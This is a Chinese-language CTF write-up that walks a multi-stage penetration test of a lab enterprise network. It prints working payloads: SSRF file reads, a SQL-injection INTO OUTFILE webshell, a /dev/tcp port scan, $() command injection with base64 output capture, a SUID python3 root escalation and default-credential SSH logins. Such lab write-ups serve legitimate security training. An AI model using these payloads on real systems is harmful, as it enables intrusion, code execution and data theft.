## 题目原文

> 某大型企业遭遇APT攻击，安全团队需以攻击者视角开展全链路渗透测试。测试从企业官网入手，逐步突破多层防线，最终目标是获取核心业务系统中的机密数据。其中，企业内部部署了泛微(Weaver)OA系统，其管理员后台服务器开放了SSH服务，需要找到有效凭证进行登录。

六面 flag 分布在四台机器：入口官网容器（两面）、OA 容器（两面）、文件服务器（一面）、核心业务系统（一面）。

## 题解

### 入口与指纹

企业官网是 PHP 站点（`nginx/1.18.0` + `PHP/7.4.33`），除正常页面外有两个非常规文件：

- `/proxy.php`：一个「内网代理工具」，`?url=` 抓取任意地址并返回响应体。
- `/admin/login.php`：后台登录，带 4 位数字验证码。

后台目录列表被禁，根目录字典只能扫出 `proxy.php`、`up.php` 这类遗留文件。`up.php` 只有一行：把请求体写进 `/tmp/sshone.php`，没有任何鉴权或后缀限制。

### 关键观察

**1. `proxy.php` 的鉴权是空的。**

读源码（用 `proxy.php` 自己的 `file://` 就能读）看到：

```php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // 这里没有 exit / die / redirect
}
```

检查写了，但分支体是空的。**「存在一个 if」不等于「存在一个门」**——这个代理实际上是公开的。

**2. 抓取器的 scheme 是输入，不是固定的能力。**

页面示例只写 `http://`，但 `curl_setopt(CURLOPT_URL, $url)` 接受客户端支持的任意 scheme。把 `url` 换成 `file://` 就直接变成**任意文件读**，而且读的是执行抓取的那台主机。

**3. 后台登录的 SQL 是拼接的，数据库账号有 FILE 权限。**

```php
$id = $_GET['id'];
$sql = "SELECT * FROM articles WHERE id = " . $id;   // 直接拼接
```

初始化 SQL 里 `webapp` 账号被授予了 `FILE` 权限，`/var/www/html` 是 `777`。这三点合起来就是「UNION + INTO OUTFILE 落 webshell」。

### 利用链

**Step 1：SSRF 任意文件读，拿两面 flag 和全部源码。**

```bash
T=10.0.0.0   # 本例地址已失效
for f in /challenge/flag1.txt /challenge/flag2.txt; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "file://$f")
  curl -s "http://$T/proxy.php?url=$enc"
done
```

顺手读 `/var/www/html/proxy.php`、`/var/www/html/common/db.php`、`/var/www/html/admin/articles.php`、`/entrypoint.sh`：

- `common/db.php`：数据库账号 `webapp:webapp123`。
- `admin/articles.php`：`id` 未过滤，直接拼进 `SELECT`。
- `proxy.php`：确认鉴权为空。

**Step 2：SQL 注入 → 文件写 → webshell。**

先探列数（`articles` 表 9 列），再把 PHP 代码 hex 编码后写文件：

```bash
CODE='<?php echo "OK"; echo shell_exec($_REQUEST["c"]); ?>'
HEX=$(printf '%s' "$CODE" | xxd -p | tr -d '\n')
PAYLOAD="0 UNION SELECT 0x$HEX,2,3,4,5,6,7,8,9 INTO OUTFILE '/var/www/html/x.php'-- -"
curl -s -G -b cookie.txt \
  --data-urlencode "action=edit" --data-urlencode "id=$PAYLOAD" \
  "http://$T/admin/articles.php"
curl -s "http://$T/x.php?c=id"
# uid=33(www-data)
```

要点：

- 写文件用 `INTO OUTFILE` 时，**不要用影响行数判断成功**，直接请求写出来的路径。
- 失败时数据库的报错会指出「权限不足」或「路径已存在」，先读报错再改 payload。
- 落点必须选在 nginx 会解析 PHP 的目录（`/var/www/html`）。

**Step 3：从 web 容器看内网。**

```bash
ls -la /challenge /var/www/html
ip -4 addr; cat /etc/hosts
# 172.18.0.3 → OA
# 172.18.0.4 → ?
for i in $(seq 1 12); do
  for p in 22 80 8080 21; do
    timeout 1 bash -c "echo > /dev/tcp/172.18.0.$i/$p" 2>/dev/null && echo "172.18.0.$i:$p"
  done
done
```

扫出 OA（80）、文件服务器（21/22）、核心系统（8080）。

**Step 4：OA 后台口令与管理员页面。**

OA 登录页没有验证码，用常见口令字典直接命中 `admin:P@ssword`。该口令的 hash 与 `oa_users` 表里 `admin` 的 MD5 一致，说明这是预置弱口令。

登录后：

- `/admin` 页面直接渲染「管理员机密信息」，包含一面 flag，并给出内网核心服务器地址。
- `/admin/system` 是一张配置表，其中 `system_announcement_secret` 也是同一面 flag。

OA 容器里还有第二面 flag，在 `/challenge/flag4.txt`，权限 `0400 root:root`，`www-data` 读不到。

**Step 5：OA 的网络诊断 = 命令注入 + 输出通道。**

`tools.php` 把 `host` 拼进 `ping`：

```php
$cmd = "ping -c 3 -W 3 " . $host . " 2>&1";
$output = shell_exec($cmd);
```

过滤只挡 `;`、`&&`、反引号和换行，**没有挡 `$()`**。第一次测试：

```bash
host=127.0.0.1$(id)
# ping: groups=33(www-data): Name or service not known
```

命令确实执行了。`ping` 把参数里的空格拆成多个主机名，逐个报错，而报错信息把输出回显了出来——**包装命令的报错就是输出通道**。

为了稳定取回结果，把命令输出 base64 成单个 token：

```bash
# 在目标上
host=127.0.0.1$(base64 -w0 /challenge/flag4.txt)
# ping: 127.0.0.1ZmxhZ3s...: Name or service not known
```

再把 `ping:` 和 `:` 之间的 base64 解回来即可。这个通道可以读任意文件、执行任意命令。

**Step 6：SUID 解释器提权。**

读 OA 容器的 `/entrypoint.sh`：

```bash
chmod u+s /usr/bin/python3
chmod 0400 /challenge/flag4.txt
```

`python3` 带 setuid 位，直接：

```python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("cat /challenge/flag4.txt")'
```

拿到 flag4。**启动脚本同时写了「怎么提权」和「提权保护哪个文件」**，不需要自己猜。

**Step 7：文件服务器 → 核心系统。**

文件服务器是泛微 OA 的后台，开放 21（vsFTPd）和 22（OpenSSH 8.9）。题目原文与 hint 都指向「用与产品相关的常见默认凭证爆破 SSH」。直接命中 `admin:Weaver@2023`。

登录后：

```bash
ls -la /challenge /home/admin /home/admin/backup
cat /challenge/*.txt
cat /home/admin/backup/flag5.txt
unzip -o /home/admin/backup/credentials.zip -d /tmp/cr
```

`credentials.zip` 是传统加密（`zip -P 123456`），口令就是最小的数字构造。解出的 `credentials.txt` 给出核心系统账号 `sysadmin:Pr0d#Secure!2023`。

**Step 8：核心业务系统。**

`172.18.0.2:8080` 是 Flask + gunicorn 的核心系统，`/login` 用上面的凭据登录后跳 `/dashboard`，dashboard 的「系统核心密钥」就是最后一面 flag。

### 复盘

- **先读，后爆破。** 拿到任意文件读之后，源码、初始化 SQL、启动脚本里已经写清了数据库口令、SUID 和下一步的 SSH 口令。在外部反复爆破 SSH/FTP 花掉的时间，本可以一次文件读解决。
- **空鉴权分支是最容易被忽略的漏洞。** 代码里有 `if (!isset($_SESSION[...]))` 不代表有门，要看分支体有没有 `exit`。
- **抓取器的 scheme 必须单独测。** `http://` 能用不代表 `file://` 不能用，`php://`、`gopher://` 同理。
- **命令注入的判据是「谁执行了」。** 包装命令把参数拆词并报错，报错本身就是回显；把输出编码成单 token 就能稳定取回。
- **权限位与启动脚本一起读。** `chmod u+s python3` 和 `chmod 0400 flag4` 在同一个文件里，前者就是后者的解法。
- **内网不可达要区分「服务不存在」和「本机没有路由」。** 本例 SSH 需要从 web 容器转发，FTP 则可以从外部直接连。
